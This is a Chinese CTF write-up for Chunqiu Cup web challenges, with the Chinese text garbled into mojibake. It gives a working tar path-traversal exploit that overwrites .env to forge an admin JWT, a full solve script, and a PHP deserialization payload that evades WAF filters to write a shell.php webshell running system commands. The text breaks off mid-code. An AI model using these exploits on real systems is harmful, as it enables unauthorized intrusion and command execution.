os.MkdirAll(userDir, os.ModePerm)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>, err<br>&#125;<br>tarFile, err := os.Open(tarPath)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>, err<br>&#125;<br><span class="hljs-keyword">defer</span> tarFile.Close()<br>extractor := &amp;tar.Extractor&#123;<br>Path: userDir,<br>&#125;<br>err = extractor.Extract(tarFile)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>, err<br>&#125;<br><span class="hljs-keyword">return</span> userDir, <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><p>å®˜æ–¹wpè¯´é¢˜ç›®å·§åˆçš„åœ¨<code>LoginHandler</code>å¤„åŠ è½½äº†ç¯å¢ƒéå†ï¼ˆé»˜è®¤è¯»å–.envï¼‰ï¼Œå› æ­¤å¯ä»¥å®ç°è¦†ç›–.envæ–‡ä»¶ä¿®æ”¹jwtå¯†é’¥ï¼ˆæŠ½è±¡å·§åˆã€‚ã€‚ã€‚è¦†ç›–.envæ–‡ä»¶ç¡®å®æ²¡æ€ä¹ˆæƒ³åˆ°ï¼‰</p><p><img src="/2025/01/17/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B2024-2025/image-20250118001111873.png" alt="image-20250118001111873"></p><p>æ‰€ä»¥åªéœ€åœ¨ä¸€ä¸ªæ–‡ä»¶å¤¹é‡Œåˆ›å»º.envæ–‡ä»¶ï¼Œé‡Œé¢å†™</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">JWT_SECRET=xxx<br></code></pre></td></tr></table></figure><p>ç„¶ååˆ›å»ºä¸€ä¸ªtarï¼Œè¿™ä¸ªtarè®¾å®šè·¯å¾„ä¸º..&#x2F;..&#x2F;..&#x2F;..&#x2F;.envå°±å¯ä»¥è·¯å¾„ç©¿è¶Šã€‚</p><p>å†™æˆå‘½ä»¤è¡Œå½¢å¼å°±æ˜¯ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> exp<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;JWT_SECRET=hack&quot;</span> &gt; exp/.env<br>tar --create --file=hack.tar --transform <span class="hljs-string">&#x27;s,exp/,exp/../,&#x27;</span> exp/.env<br></code></pre></td></tr></table></figure><p>è¿™ä¹Ÿæ˜¯UNIXçš„taræœ¬èº«çš„æ¼æ´ä¹‹ä¸€ï¼Œè€Œä¸”pythonçš„taræ–¹æ³•ä¹Ÿç”¨çš„è¿™ç§æ–¹å¼ï¼Œæ‰€ä»¥å¯ä»¥å†™æˆè¿™ç§ä»£ç å½¢å¼ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Create the directory and .env file</span><br>os.makedirs(<span class="hljs-string">&#x27;exp&#x27;</span>, exist_ok=<span class="hljs-literal">True</span>)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;exp/.env&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>f.write(<span class="hljs-string">&quot;JWT_SECRET=hack&quot;</span>)<br><br><span class="hljs-comment"># Create the tar file with the path traversal</span><br><span class="hljs-keyword">with</span> tarfile.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;hack.tar&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> tar:<br>tar.add(<span class="hljs-string">&#x27;exp/.env&#x27;</span>, arcname=<span class="hljs-string">&#x27;exp/../../../.env&#x27;</span>)<br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥å°±æ˜¯æ™®é€šçš„æ³¨å†Œç™»å½•ä¸Šä¼ é€ cookieå†CSRFçš„è¿‡ç¨‹ï¼Œå®˜æ–¹ç”¨äº†ä¸ªä¸€æŠŠæ¢­è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> jwt<br><span class="hljs-keyword">import</span> datetime<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> tarfile<br><span class="hljs-comment"># import sys</span><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> string<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_random_string</span>(<span class="hljs-params">length</span>):<br>    letters = string.ascii_letters + string.digits<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join(random.choice(letters) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(length))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">send_request</span>(<span class="hljs-params">session, method, path, data=<span class="hljs-literal">None</span>, files=<span class="hljs-literal">None</span>, headers=<span class="hljs-literal">None</span></span>):<br>    url = <span class="hljs-string">f&quot;http://<span class="hljs-subst">&#123;session.url&#125;</span><span class="hljs-subst">&#123;path&#125;</span>&quot;</span><br>    response = session.request(method, url, data=data, files=files, headers=headers)<br>    <span class="hljs-keyword">return</span> response<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_jwt</span>(<span class="hljs-params">user_id, is_admin, jwt_key</span>):<br>    expiration_time = datetime.datetime.utcnow() + datetime.timedelta(hours=<span class="hljs-number">24</span>)<br>    claims = &#123;<br>        <span class="hljs-string">&#x27;UserID&#x27;</span>: user_id,<br>        <span class="hljs-string">&#x27;IsAdmin&#x27;</span>: is_admin,<br>        <span class="hljs-string">&#x27;exp&#x27;</span>: expiration_time<br>    &#125;<br>    token = jwt.encode(claims, jwt_key, algorithm=<span class="hljs-string">&#x27;HS256&#x27;</span>)<br>    <span class="hljs-keyword">return</span> token<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create_malicious_tar</span>():<br>    <span class="hljs-comment"># Create the directory and .env file</span><br>    os.makedirs(<span class="hljs-string">&#x27;exp&#x27;</span>, exist_ok=<span class="hljs-literal">True</span>)<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;exp/.env&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        f.write(<span class="hljs-string">&quot;JWT_SECRET=hack&quot;</span>)<br><br>    <span class="hljs-comment"># Create the tar file with the path traversal</span><br>    <span class="hljs-keyword">with</span> tarfile.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;hack.tar&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> tar:<br>        tar.add(<span class="hljs-string">&#x27;exp/.env&#x27;</span>, arcname=<span class="hljs-string">&#x27;exp/../../../.env&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>(<span class="hljs-params">url, token</span>):<br><br>    session = requests.Session()<br>    session.url = url<br><br>    random_string = generate_random_string(<span class="hljs-number">4</span>)<br><br>    user_data = &#123;<br>        <span class="hljs-string">&quot;username&quot;</span>: random_string,<br>        <span class="hljs-string">&quot;password&quot;</span>: random_string<br>    &#125;<br>    response1 = send_request(session, <span class="hljs-string">&#x27;POST&#x27;</span>, <span class="hljs-string">&#x27;/register&#x27;</span>, data=user_data)<br>    <span class="hljs-keyword">if</span> response1.status_code != <span class="hljs-number">200</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Failed to register&quot;</span><br>    response2 = send_request(session, <span class="hljs-string">&#x27;POST&#x27;</span>, <span class="hljs-string">&#x27;/login&#x27;</span>, data=user_data)<br>    <span class="hljs-keyword">if</span> response2.status_code != <span class="hljs-number">200</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Failed to login&quot;</span><br><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;hack.tar&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        files = &#123;<span class="hljs-string">&#x27;file&#x27;</span>: f&#125;<br>        response3 = send_request(session, <span class="hljs-string">&#x27;POST&#x27;</span>, <span class="hljs-string">&#x27;/upload&#x27;</span>, files=files)<br>        <span class="hljs-keyword">if</span> response3.status_code != <span class="hljs-number">200</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Failed to upload malicious tar file&quot;</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Malicious tar file uploaded successfully&quot;</span>)<br><br>    <span class="hljs-comment"># è§¦å‘åŠ è½½ç¯å¢ƒå˜é‡</span><br>    send_request(session, <span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;/login&#x27;</span>)<br>    headers = &#123;<br>        <span class="hljs-string">&#x27;Cookie&#x27;</span>: <span class="hljs-string">f&#x27;token=<span class="hljs-subst">&#123;token&#125;</span>&#x27;</span><br>    &#125;<br>    response4 = send_request(session, <span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;/download/1&#x27;</span>, headers=headers)<br>    <span class="hljs-keyword">return</span> response4.text<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    create_malicious_tar()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Malicious tar file created: hack.tar&quot;</span>)<br><br>    jwt_key = <span class="hljs-string">&quot;hack&quot;</span><br>    user_id = <span class="hljs-number">1</span><br>    is_admin = <span class="hljs-literal">True</span><br><br>    token = generate_jwt(user_id, is_admin, jwt_key)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Generated JWT:&quot;</span>, token)<br><br>    URL = <span class="hljs-string">&quot;eci-2ze0cotvkmimmcve27y0.cloudeci1.ichunqiu.com:80&quot;</span><br>    flag = exp(URL, token)<br>    <span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><p><img src="/2025/01/17/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B2024-2025/image-20250118001636167.png" alt="image-20250118001636167"></p><p>ç¬¬äºŒå¤©æœ‰ç¼˜å†çœ‹å§ï¼Œè·Ÿè¥¿æ¹–æ’äº†hhhã€‚</p><hr><h2 id="day2-easy-ser"><a href="#day2-easy-ser" class="headerlink" title="day2-easy_ser"></a>day2-easy_ser</h2><p>popé“¾ç®€å•ï¼Œä¸å¤šè¯´ã€‚</p><p>ç»•waf1å’Œwaf3ä¹Ÿç®€å•ï¼Œæ‹¼æ¥å°±ç»•äº†ã€‚</p><p>waf2æœ‰ç‚¹ä¸œè¥¿ï¼Œä¼šç»™ä½ æ ¼å¼åŒ–è¾“å‡ºï¼Œè¿™æ ·å°±ç›¸å½“äºè®©ä½ å†™ğŸè¿›å»ä¸­é—´æœ‰ä¸€å †åå…­è¿›åˆ¶ç‰¹å¾å­—ç¬¦ï¼Œphpæ²¡ç”¨äº†ã€‚</p><p>å…¶å®å¾ˆç®€å•ï¼Œæ‚Ÿåˆ°äº†ç›´æ¥010editorä¸€è¡Œä¸€è¡Œç”¨</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">/* */</span><br></code></pre></td></tr></table></figure><p>æ¥æ³¨é‡Šæ‰å¤šä½™çš„åå…­è¿›åˆ¶ä¿¡æ¯å°±è¡Œäº†ï¼Œç„¶åå’Œæ‹¼æ¥é…åˆä¸€ä¸‹ï¼Œæ¯è¡Œåå…­ä¸ªå­—ç¬¦å†…èƒ½æ”¾ä¸‹æ¯è¡Œçš„payloadï¼š</p><p>æˆ‘é€‰æ‹©é€ çš„payloadï¼ˆè¿™é‡Œç”¨&lt;?phpä¼šæŠ¥é”™ï¼Œä¸çŸ¥é“ä¸ºå•¥ï¼Œä½†æ˜¯ç”¨çŸ­æ ‡ç­¾å°±æ²¡é—®é¢˜ï¼‰:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?</span><br><span class="hljs-variable">$s</span>=<span class="hljs-string">&#x27;s&#x27;</span>;<br><span class="hljs-variable">$y</span>=<span class="hljs-string">&#x27;y&#x27;</span>;<br><span class="hljs-variable">$t</span>=<span class="hljs-string">&#x27;t&#x27;</span>;<br><span class="hljs-variable">$e</span>=<span class="hljs-string">&#x27;e&#x27;</span>;<br><span class="hljs-variable">$m</span>=<span class="hljs-string">&#x27;m&#x27;</span>;<br><span class="hljs-variable">$x</span>=<span class="hljs-variable">$s</span>.<span class="hljs-variable">$y</span>;<br><span class="hljs-variable">$y</span>=<span class="hljs-variable">$x</span>.<span class="hljs-variable">$s</span>;<br><span class="hljs-variable">$z</span>=<span class="hljs-variable">$y</span>.<span class="hljs-variable">$t</span>;<br><span class="hljs-variable">$a</span>=<span class="hljs-variable">$z</span>.<span class="hljs-variable">$e</span>;<br><span class="hljs-variable">$b</span>=<span class="hljs-variable">$a</span>.<span class="hljs-variable">$m</span>;<br><span class="hljs-variable">$c</span>=<span class="hljs-string">&#x27;whoami&#x27;</span>;<br><span class="hljs-variable">$b</span>(<span class="hljs-variable">$c</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>ç›´æ¥å¼€é€ ï¼š</p><p><img src="/2025/01/17/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B2024-2025/image-20250119003613119.png" alt="image-20250119003613119"></p><p>å¾—åˆ°ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?</span>   <span class="hljs-comment">/*         */</span><span class="hljs-variable">$s</span>=<span class="hljs-string">&#x27;s&#x27;</span>;<span class="hljs-comment">/*     */</span><span class="hljs-variable">$y</span>=<span class="hljs-string">&#x27;y&#x27;</span>;<span class="hljs-comment">/*     */</span><span class="hljs-variable">$t</span>=<span class="hljs-string">&#x27;t&#x27;</span>;<span class="hljs-comment">/*     */</span><span class="hljs-variable">$e</span>=<span class="hljs-string">&#x27;e&#x27;</span>;<span class="hljs-comment">/*     */</span><span class="hljs-variable">$m</span>=<span class="hljs-string">&#x27;m&#x27;</span>;<span class="hljs-comment">/*     */</span><span class="hljs-variable">$x</span>=<span class="hljs-variable">$s</span>.<span class="hljs-variable">$y</span>;<span class="hljs-comment">/*   */</span><span class="hljs-variable">$y</span>=<span class="hljs-variable">$x</span>.<span class="hljs-variable">$s</span>;<span class="hljs-comment">/*   */</span><span class="hljs-variable">$z</span>=<span class="hljs-variable">$y</span>.<span class="hljs-variable">$t</span>;<span class="hljs-comment">/*   */</span><span class="hljs-variable">$a</span>=<span class="hljs-variable">$z</span>.<span class="hljs-variable">$e</span>;<span class="hljs-comment">/*   */</span><span class="hljs-variable">$b</span>=<span class="hljs-variable">$a</span>.<span class="hljs-variable">$m</span>;<span class="hljs-comment">/*   */</span><span class="hljs-variable">$c</span>=<span class="hljs-string">&#x27;cat &#x27;</span>;<span class="hljs-comment">/*  */</span><span class="hljs-variable">$d</span>=<span class="hljs-string">&#x27;/f*&#x27;</span>;<span class="hljs-comment">/*   */</span><span class="hljs-variable">$r</span>=<span class="hljs-variable">$c</span>.<span class="hljs-variable">$d</span>;<span class="hljs-comment">/*   */</span><span class="hljs-variable">$b</span>(<span class="hljs-variable">$r</span>)<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>base64ç¼–ç å†æ”¾expé‡Œæ¢­åºåˆ—åŒ–ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//error_reporting(0);</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">PassWAF1</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span>&#123;<br>    <span class="hljs-variable">$BlackList</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;eval&quot;</span>, <span class="hljs-string">&quot;system&quot;</span>, <span class="hljs-string">&quot;popen&quot;</span>, <span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-string">&quot;assert&quot;</span>, <span class="hljs-string">&quot;phpinfo&quot;</span>, <span class="hljs-string">&quot;shell_exec&quot;</span>,  <span class="hljs-string">&quot;pcntl_exec&quot;</span>, <span class="hljs-string">&quot;passthru&quot;</span>, <span class="hljs-string">&quot;popen&quot;</span>, <span class="hljs-string">&quot;putenv&quot;</span>);<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$BlackList</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$value</span>) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/&quot;</span> . <span class="hljs-variable">$value</span> . <span class="hljs-string">&quot;/im&quot;</span>, <span class="hljs-variable">$data</span>)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">PassWAF2</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-variable">$output</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-variable">$count</span> = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-title function_ invoke__">str_split</span>(<span class="hljs-variable">$str</span>, <span class="hljs-number">16</span>) <span class="hljs-keyword">as</span> <span class="hljs-variable">$v</span>) &#123;<br>        <span class="hljs-variable">$hex_string</span> = <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-title function_ invoke__">str_split</span>(<span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-variable">$v</span>), <span class="hljs-number">4</span>));<br>        <span class="hljs-variable">$ascii_string</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-title function_ invoke__">str_split</span>(<span class="hljs-variable">$v</span>) <span class="hljs-keyword">as</span> <span class="hljs-variable">$c</span>) &#123;<br>            <span class="hljs-variable">$ascii_string</span> .= ((<span class="hljs-variable">$c</span> &lt; <span class="hljs-string">&#x27; &#x27;</span> || <span class="hljs-variable">$c</span> &gt; <span class="hljs-string">&#x27;~&#x27;</span>) ? <span class="hljs-string">&#x27;.&#x27;</span> : <span class="hljs-variable">$c</span>);<br>        &#125;<br>        <span class="hljs-variable">$output</span> .= <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&quot;%08x: %-40s %-16s\n&quot;</span>, <span class="hljs-variable">$count</span>, <span class="hljs-variable">$hex_string</span>, <span class="hljs-variable">$ascii_string</span>);<br>        <span class="hljs-variable">$count</span> += <span class="hljs-number">16</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$output</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">PassWAF3</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span>&#123;<br>    <span class="hljs-variable">$BlackList</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;\.\.&quot;</span>, <span class="hljs-string">&quot;\/&quot;</span>);<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$BlackList</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$value</span>) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/&quot;</span> . <span class="hljs-variable">$value</span> . <span class="hljs-string">&quot;/im&quot;</span>, <span class="hljs-variable">$data</span>)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Base64Decode</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>)</span>&#123;<br>    <span class="hljs-variable">$decodeStr</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$s</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_bool</span>(<span class="hljs-variable">$decodeStr</span>)) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;gg&quot;</span>;<br>        <span class="hljs-keyword">exit</span>(-<span class="hljs-number">1</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$decodeStr</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">STU</span></span>&#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$stu</span>;<span class="hljs-comment">// = new CTF();</span><br>&#125;<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SDU</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$Dazhuan</span>;<span class="hljs-comment">// = new STU();</span><br>&#125;<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CTF</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$hackman</span>; <span class="hljs-comment">//base64çš„payload</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>;<br><br>&#125;<br><br><span class="hljs-variable">$stu</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">STU</span>();<br><span class="hljs-variable">$sdu</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">SDU</span>();<br><span class="hljs-variable">$ctf</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">CTF</span>();<br><span class="hljs-variable">$sdu</span>-&gt;Dazhuan = <span class="hljs-variable">$stu</span>;<br><span class="hljs-variable">$stu</span>-&gt;stu = <span class="hljs-variable">$ctf</span>;<br><span class="hljs-variable">$ctf</span>-&gt;hackman = <span class="hljs-string">&quot;PD8gICAvKiAgICAgICAgICovJHM9J3MnOy8qICAgICAqLyR5PSd5JzsvKiAgICAgKi8kdD0ndCc7LyogICAgICovJGU9J2UnOy8qICAgICAqLyRtPSdtJzsvKiAgICAgKi8keD0kcy4keTsvKiAgICovJHk9JHguJHM7LyogICAqLyR6PSR5LiR0Oy8qICAgKi8kYT0kei4kZTsvKiAgICovJGI9JGEuJG07LyogICAqLyRjPSdjYXQgJzsvKiAgKi8kZD0nL2YqJzsvKiAgICovJHI9JGMuJGQ7LyogICAqLyRiKCRyKT8+&quot;</span>;<br><span class="hljs-variable">$ctf</span>-&gt;filename = <span class="hljs-string">&quot;shell.php&quot;</span>;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$sdu</span>));<br></code></pre></td></tr></table></figure><p><img src="/2025/01/17/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B2024-2025/image-20250119003834715.png" alt="image-20250119003834715"></p><h2 id="day2-b0okshelf"><a href="#day2-b0okshelf" class="headerlink" title="day2-b0okshelf"></a>day2-b0okshelf</h2><p>é‚£ä¸ªæœ‰é—®é¢˜çš„easy_codeé¢˜ä¸‹äº†æŒºæŠ½è±¡çš„ï¼Œåæ­£ä¹Ÿä¸æƒ³çœ‹äº†ã€‚</p><p>è¿™ä¸ªé¢˜æœ‰ç‚¹æ„æ€ï¼Œæœ€ååšå‡ºæ¥çš„åªæœ‰ä¸€ä¸ªäººï¼Œçº¯ç¼åˆæ€ªã€‚æˆ–è®¸æ˜¯å¤§å“¥ä»¬éƒ½å»çœ‹è¥¿æ¹–äº†æ²¡äººæ‰“é¢˜å§ã€‚</p><p>æµ…æµ…å¤ç°ä¸€ä¸‹ï¼Œé¦–å…ˆrobots.txtï¼š</p><p><img src="/2025/01/17/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B2024-2025/image-20250119004111330.png" alt="image-20250119004111330"></p><p>è®¿é—®ä¸€ä¸‹backup.zipè·å¾—æºç ï¼š</p><p>update.phpï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span 